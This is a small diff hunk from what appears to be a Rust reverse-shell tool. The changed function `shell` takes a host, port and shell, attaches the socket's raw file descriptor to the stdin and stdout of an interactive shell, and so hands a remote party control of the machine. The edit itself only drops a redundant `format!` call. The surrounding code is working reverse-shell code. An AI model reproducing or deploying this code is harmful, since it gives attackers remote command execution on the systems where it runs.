@@ -9,7 +9,7 @@ pub fn shell(host: String, port: String, shell: String) -> Result<()> {
     let fd = sock.as_raw_fd();
 
     // Open shell
-    Command::new(format!("{}", shell))
+    Command::new(shell)
         .arg("-i")
         .stdin(unsafe { Stdio::from_raw_fd(fd) })
         .stdout(unsafe { Stdio::from_raw_fd(fd) })
